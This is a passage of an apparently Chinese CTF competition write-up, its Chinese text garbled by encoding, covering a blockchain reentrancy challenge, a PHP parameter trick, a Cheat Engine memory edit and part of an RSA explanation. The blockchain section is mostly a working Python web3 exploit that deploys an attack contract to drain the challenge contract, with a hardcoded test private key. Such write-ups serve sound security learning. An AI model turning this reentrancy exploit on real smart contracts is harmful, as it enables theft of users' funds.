title="ä»€ä¹ˆ?æ³¨å…¥?çœŸçš„å‡çš„"></a>ä»€ä¹ˆ?æ³¨å…¥?çœŸçš„å‡çš„</h3><ol><li>ncat 119.8.106.225 20001è¿æ¥æœåŠ¡å™¨<br><img src="/img/CTF/inject-2.png"><br>æ ¹æ®é€‰é¡¹æç¤ºåšå‡ºå†³ç­–<br>é¦–å…ˆé€‰æ‹©1ï¼Œé¢˜ç›®ä¼šç»™å‡ºéƒ¨ç½²è´¦æˆ·(deployer account)å’Œæ ‡å¿—èº«ä»½çš„ä¿¡æ¯(token),è¦æ±‚å‘è¯¥è´¦æˆ·è½¬å…¥0.001æµ‹è¯•å¸</li><li>è¿æ¥ä»¥å¤ªåŠç»“ç‚¹ï¼Œåˆå§‹åŒ–è´¦æˆ·ä¿¡æ¯<br><img src="/img/CTF/inject-4.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥åˆ°ä»¥å¤ªåŠèŠ‚ç‚¹</span></span><br><span class="line">infura_url = <span class="string">&quot;http://119.8.106.225:8546&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆä¸€ä¸ªæ–°çš„è´¦æˆ·</span></span><br><span class="line">account = Account.create()</span><br><span class="line"><span class="comment"># æ‰“å°è´¦æˆ·åœ°å€ã€ç§é’¥å’Œå…¬é’¥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;åœ°å€: <span class="subst">&#123;account.address&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ç§é’¥: <span class="subst">&#123;account.key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨ç”Ÿæˆçš„è´¦æˆ·åœ°å€å»æ°´é¾™å¤´é¢†å–æµ‹è¯•å¸<br><img src="/img/CTF/inject-5.png"></li><li>å®Œæˆäº¤æ˜“,è·å–åˆçº¦åœ°å€<br><img src="/img/CTF/inject-6.png"><br><img src="/img/CTF/inject-3.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›è¡Œäº¤æ˜“</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥åˆ° RPC åœ°å€</span></span><br><span class="line">rpc_url = <span class="string">&quot;http://119.8.106.225:8546&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½ çš„æµ‹è¯•é’±åŒ…åœ°å€å’Œç§é’¥</span></span><br><span class="line">eth_address = <span class="string">&quot;0x9ca6A53A9b47C04dcbca625d55980D46a97Eef70&quot;</span></span><br><span class="line">private_key = <span class="string">&quot;d78192d532e5a3bde6a8bfbae6ff7f302c318a1e76a35d1bb4d7c2199cd79843&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡éƒ¨ç½²è´¦æˆ·ï¼ˆdeployer accountï¼‰</span></span><br><span class="line">deployer_address = <span class="string">&quot;0x03CB80078a336E2e08fF48C3036Fa3FC2d7B3e2d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–é“¾ ID</span></span><br><span class="line">chain_id = w3.eth.chain_id</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„å»ºäº¤æ˜“</span></span><br><span class="line">tx = &#123;</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(eth_address),</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: deployer_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: w3.to_wei(<span class="number">0.001</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">25000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: chain_id  <span class="comment"># æ·»åŠ é“¾ ID</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç§é’¥ç­¾åäº¤æ˜“</span></span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, private_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€äº¤æ˜“</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;äº¤æ˜“å·²å‘é€ï¼Œäº¤æ˜“å“ˆå¸Œ: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç­‰å¾…äº¤æ˜“ç¡®è®¤</span></span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;äº¤æ˜“æˆåŠŸï¼äº¤æ˜“å“ˆå¸Œ: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li><li>æŸ¥çœ‹åˆçº¦ç <br>å‘ç°withdraw å‡½æ•°ä¸­å­˜åœ¨<strong>é‡å…¥æ”»å‡»æ¼æ´</strong><br>é€šè¿‡é€’å½’è°ƒç”¨ withdraw å‡½æ•°ï¼Œåå¤æå–èµ„é‡‘ï¼Œç›´åˆ°ä½™é¢å˜ä¸ºè´Ÿæ•°ï¼Œå¹¶è¶…è¿‡ 1000 Ether çš„æ£€æŸ¥æ¡ä»¶ï¼Œä»è€Œè§£é” isSolved çŠ¶æ€ï¼Œè·å– flagã€‚<br><img src="/img/CTF/inject.png"><br><img src="/img/CTF/inject-1.png"><br>æœ€ååœ¨å‘½ä»¤è¡Œè¿”å›flag</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥åˆ°ç›®æ ‡é“¾çš„ RPC åœ°å€</span></span><br><span class="line">rpc_url = <span class="string">&quot;http://119.8.106.225:8546&quot;</span>  <span class="comment"># åŒºå—é“¾èŠ‚ç‚¹çš„ RPC åœ°å€</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))  <span class="comment"># åˆ›å»º Web3 å®ä¾‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥ä¸åŒºå—é“¾èŠ‚ç‚¹çš„è¿æ¥çŠ¶æ€</span></span><br><span class="line"><span class="keyword">if</span> w3.is_connected():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æˆåŠŸè¿æ¥åˆ°åŒºå—é“¾èŠ‚ç‚¹&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;æ— æ³•è¿æ¥åˆ°åŒºå—é“¾èŠ‚ç‚¹&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ç”¨æˆ·è´¦æˆ·åœ°å€å’Œç§é’¥</span></span><br><span class="line">user_address = <span class="string">&quot;0x9ca6A53A9b47C04dcbca625d55980D46a97Eef70&quot;</span>  <span class="comment"># è´¦æˆ·åœ°å€</span></span><br><span class="line">user_private_key = <span class="string">&quot;d78192d532e5a3bde6a8bfbae6ff7f302c318a1e76a35d1bb4d7c2199cd79843&quot;</span>  <span class="comment"># è´¦æˆ·ç§é’¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡åˆçº¦çš„åœ°å€</span></span><br><span class="line">target_contract_address = <span class="string">&quot;0x36b1967D9F64A492C60D82823B2562206d4a0D06&quot;</span>  <span class="comment"># ç›®æ ‡åˆçº¦åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”»å‡»åˆçº¦çš„ ABI</span></span><br><span class="line">attack_contract_abi = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;address&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_vulnerableAddress&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;],</span><br><span class="line">        <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;attack&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;owner&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;address&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;vulnerable&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;contract IVulnerable&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;withdrawFunds&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;receive&quot;</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”»å‡»åˆçº¦çš„å­—èŠ‚ç ï¼ˆç”± Solidity ç¼–è¯‘å™¨ç”Ÿæˆï¼‰</span></span><br><span class="line">attack_contract_bytecode = <span class="string">&quot;6080604052600436106100595760003560e01c806327e235e3146100655780632e1a7d4d146100aa57806364d98f6e146100d65780638da5cb5b146100ff57806393aef87114610130578063b6b55f251461014557610060565b3661006057005b600080fd5b34801561007157600080fd5b506100986004803603602081101561008857600080fd5b50356001600160a01b031661016f565b60408051918252519081900360200190f35b3480156100b657600080fd5b506100d4600480360360208110156100cd57600080fd5b5035610181565b005b3480156100e257600080fd5b506100eb61021b565b604080519115158252519081900360200190f35b34801561010b57600080fd5b5061011461022b565b604080516001600160a01b039092168252519081900360200190f35b34801561013c57600080fd5b506100d461023a565b34801561015157600080fd5b506100d46004803603602081101561016857600080fd5b5035610270565b60006020819052908152604090205481565b336000908152602081905260409020548111156101d4576040805162461bcd60e51b815260206004820152600c60248201526be4bd99e9a29de4b88de8b6b360a01b604482015290519081900360640190fd5b604051339082156108fc029083906000818181858888f19350505050158015610201573d6000803e3d6000fd5b503360009081526020819052604090208054919091039055565b600154600160a01b900460ff1681565b6001546001600160a01b031681565b33600090815260208190526040902054683635c9adc5dea00000101561026e576001805460ff60a01b1916600160a01b1790555b565b3360009081526020819052604090208054909101905556fea2646970667358221220c0b48d8f73c81a21de90501da0815e6b9d921851377155170123a89c550ad10e64736f6c634300060c0033&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡åˆçº¦çš„ ABIï¼ˆç”¨äºæ£€æŸ¥æ˜¯å¦æˆåŠŸè§£å†³æŒ‘æˆ˜ï¼‰</span></span><br><span class="line">target_contract_abi = [</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;isSolved&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;bool&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span>&#125;], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;uint256&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_amount&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;deposit&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;uint256&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_amount&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;withdraw&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;receive&quot;</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½²æ”»å‡»åˆçº¦</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨éƒ¨ç½²æ”»å‡»åˆçº¦...&quot;</span>)</span><br><span class="line">Attack = w3.eth.contract(abi=attack_contract_abi, bytecode=attack_contract_bytecode)</span><br><span class="line">tx = Attack.constructor(target_contract_address).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">38142</span>,  <span class="comment"># é“¾ID</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(user_address),</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: user_address</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç§é’¥ç­¾åå¹¶å‘é€äº¤æ˜“</span></span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, user_private_key)</span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç­‰å¾…åˆçº¦éƒ¨ç½²å®Œæˆ</span></span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ”»å‡»åˆçº¦éƒ¨ç½²æˆåŠŸï¼Œåˆçº¦åœ°å€: <span class="subst">&#123;receipt.contractAddress&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨éƒ¨ç½²çš„æ”»å‡»åˆçº¦åœ°å€å®ä¾‹åŒ–åˆçº¦</span></span><br><span class="line">attack_contract = w3.eth.contract(address=receipt.contractAddress, abi=attack_contract_abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨æ”»å‡»åˆçº¦çš„ attack å‡½æ•°å‘èµ·æ”»å‡»</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨å‘èµ·æ”»å‡»...&quot;</span>)</span><br><span class="line">tx = attack_contract.functions.attack().build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">38142</span>,  <span class="comment"># é“¾ID</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(user_address),</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: user_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: w3.to_wei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>)  <span class="comment"># å‘é€1 Ether</span></span><br><span class="line">&#125;)</span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, user_private_key)</span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥ç›®æ ‡åˆçº¦æ˜¯å¦è§£å†³äº†æŒ‘æˆ˜</span></span><br><span class="line">target_contract = w3.eth.contract(address=target_contract_address, abi=target_contract_abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨ isSolved å‡½æ•°æ£€æŸ¥æŒ‘æˆ˜çŠ¶æ€</span></span><br><span class="line">is_solved = target_contract.functions.isSolved().call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æŒ‘æˆ˜æ˜¯å¦å·²è§£å†³: <span class="subst">&#123;is_solved&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>ç”±é¢˜æ„å¾—ï¼Œflagè¢«åˆ‡åˆ†ä¸ºä¸¤æ®µï¼Œå‰ä¸€æ®µè¦æ±‚ä¼ å…¥å‚æ•°ä¸ºL3HSEC,å³å¯è¿”å›å‰åŠéƒ¨åˆ†flag,åä¸€æ®µè¦æ±‚ä¼ å…¥å‚æ•°ä¸ºâ€™æˆ‘æ˜¯å¤§ç‰›â€™,ä¸”æ¯æ¬¡ä¼ å‚å­—ç¬¦ä¸²çš„é•¿åº¦ä¸å¾—å¤§äº1ï¼Œæ‰ä¼šè¿”å›ååŠéƒ¨åˆ†flag<br><img src="/img/CTF/php-1.png"></p><p>å¯¹äºå‰åŠæ®µè€ƒå¯Ÿå˜é‡å’Œå˜é‡åçš„çŸ¥è¯†ï¼Œåœ¨cmdä¸­è¾“å…¥</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://f4721935-<span class="number">26</span>b6-<span class="number">414</span>f-<span class="number">9</span>a62-<span class="number">791</span>cda2b3c30.ctf.l3hsec.com/challenge.php -d &quot;_=a&amp;a=b&amp;b=L3HSEC</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/php-2.png"><br>å¯¹äºååŠæ®µè€ƒå¯Ÿphpä¸­å­—ç¬¦ä¸²æ‹¼æ¥é—®é¢˜ï¼Œä¸€ä¸ªä¸­æ–‡å­—ç¬¦é€šè¿‡URLç¼–ç åè½¬æ¢ä¸º3ä¸ªUTF-8ç¼–ç çš„å­—ç¬¦ï¼Œå°†â€™æˆ‘æ˜¯å¤§ç‰›â€™é€šè¿‡URLç¼–ç åï¼Œå†ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°ä¼ é€’å‚æ•°ï¼Œphpè‡ªåŠ¨æ‹¼æ¥åå½¢æˆâ€™æˆ‘æ˜¯å¤§ç‰›â€™,å·§å¦™è§£å†³äº†å­—ç¬¦ä¸²é•¿åº¦ä¸å¤§äº1çš„é—®é¢˜<br><img src="/img/CTF/php-3.png"><br><img src="/img/CTF/php-4.png"><br>å‰åæ‹¼æ¥åæˆåŠŸå¾—åˆ°flag</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="å¬è¯´ä½ æ˜¯pvzé«˜æ‰‹"><a href="#å¬è¯´ä½ æ˜¯pvzé«˜æ‰‹" class="headerlink" title="å¬è¯´ä½ æ˜¯pvzé«˜æ‰‹"></a>å¬è¯´ä½ æ˜¯pvzé«˜æ‰‹</h3><p>é¢˜ç›®è¦æ±‚æ”¶é›†10000é˜³å…‰å³å¯è·å¾—flag<br>ä½¿ç”¨ <strong>Cheat Engine (CExä¿®æ”¹å™¨)</strong> æ‰¾åˆ°ç¨‹åºè¿›ç¨‹ï¼Œå†å°è¯•æ‰«æå½“å‰çš„é˜³å…‰æ•°ï¼Œæ‰¾åˆ°é˜³å…‰æ‰€å æœ‰çš„å†…å­˜ï¼Œé€šè¿‡ä¿®æ”¹å†…å­˜ä¸­é˜³å…‰æ•°ï¼ŒæˆåŠŸå¾—åˆ°flag<br><img src="/img/CTF/pvz-1.png"><br><img src="/img/CTF/pvz-2.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="big-math"><a href="#big-math" class="headerlink" title="big_math"></a>big_math</h3><blockquote><p>RSAåŠ å¯†æ˜¯ä¸€ç§<strong>éå¯¹ç§°åŠ å¯†ç®—æ³•</strong><br>RSAåŠ å¯†ä½¿ç”¨ä¸€å¯¹å¯†é’¥ï¼š<strong>å…¬é’¥</strong>å’Œ<strong>ç§é’¥</strong>ã€‚å…¬é’¥ç”¨äºåŠ å¯†ï¼Œç§é’¥ç”¨äºè§£å¯†<br>RSAçš„å®‰å…¨æ€§åŸºäºå¤§æ•°åˆ†è§£çš„å›°éš¾æ€§ï¼Œå°¤å…¶æ˜¯å¤§ç´ æ•°ä¹˜ç§¯çš„åˆ†è§£é—®é¢˜</p></blockquote><p><strong>RSAåŠ å¯†çš„åŸºæœ¬åŸç†</strong></p><ol><li>å¯†é’¥ç”Ÿæˆ<br>ä¸ºäº†ç”Ÿæˆ RSA å¯†é’¥ï¼Œéœ€è¦è¿›è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</li></ol><ul><li><strong>é€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•° (p) å’Œ (q)ï¼š</strong></li><li><strong>è®¡ç®—æ¨¡æ•° (n)ï¼š</strong><br>[<br>n &#x3D; p \times q<br>]<br>æ¨¡æ•° (n) æ˜¯ RSA å…¬é’¥å’Œç§é’¥çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œç”¨äºåŠ å¯†å’Œè§£å¯†ã€‚</li><li><strong>è®¡ç®—æ¬§æ‹‰å‡½æ•° (\phi(n))ï¼š</strong><br>æ¬§æ‹‰å‡½æ•° (\phi(n)) æ˜¯åœ¨æ¨¡ (n) ä¸‹çš„å¯é€†æ•´æ•°ä¸ªæ•°ï¼Œå¯¹äºä¸¤ä¸ªç´ æ•° (p) å’Œ (q)ï¼Œæ¬§æ‹‰å‡½æ•°çš„å€¼ä¸ºï¼š<br>[<br>\phi(n) &#x3D; (p-1) \times (q-1)<br>]</li><li><strong>é€‰æ‹©å…¬é’¥æŒ‡æ•° (e)ï¼š</strong><br>é€‰æ‹©ä¸€ä¸ªæ•´æ•° (e)ï¼Œä½¿å¾— (1 &lt; e &lt; \phi(n))ï¼Œå¹¶ä¸” (e) ä¸ (\phi(n)) äº’è´¨ï¼ˆå³ (\gcd(e, \phi(n)) &#x3D; 1)ï¼‰</li><li><strong>è®¡ç®—ç§é’¥æŒ‡æ•° (d)ï¼š</strong><br>ç§é’¥æŒ‡æ•° (d) æ˜¯ (e) åœ¨æ¨¡ (\phi(n)) ä¸‹çš„é€†å…ƒï¼Œå³ï¼š<br>[<br>e \cdot d \equiv 1 \ (\text{mod} \ \phi(n))<br>]<br>è¿™ä¸ª (d) é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®—å¾—åˆ°ã€‚</li></ul><ol start="2"><li><p>åŠ å¯†è¿‡ç¨‹<br>åŠ å¯†è¿‡ç¨‹ä½¿ç”¨å…¬é’¥è¿›è¡Œã€‚å‡è®¾éœ€è¦åŠ å¯†çš„æ¶ˆæ¯ä¸º (m)ï¼ˆæ¶ˆæ¯ (m) æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œä¸” (0 \leq m &lt; n)ï¼‰ï¼ŒåŠ å¯†å…¬å¼ä¸ºï¼š<br>[<br>c &#x3D; m^e \ (\text{mod} \ n)<br>]<br>å…¶ä¸­ï¼Œ(c) æ˜¯åŠ å¯†åçš„å¯†æ–‡ã€‚</p></li><li><p>è§£å¯†è¿‡ç¨‹<br>è§£å¯†è¿‡ç¨‹ä½¿ç”¨ç§é’¥è¿›è¡Œã€‚è§£å¯†æ—¶ï¼Œä½¿ç”¨åŠ å¯†å¾—åˆ°çš„å¯†æ–‡ (c) 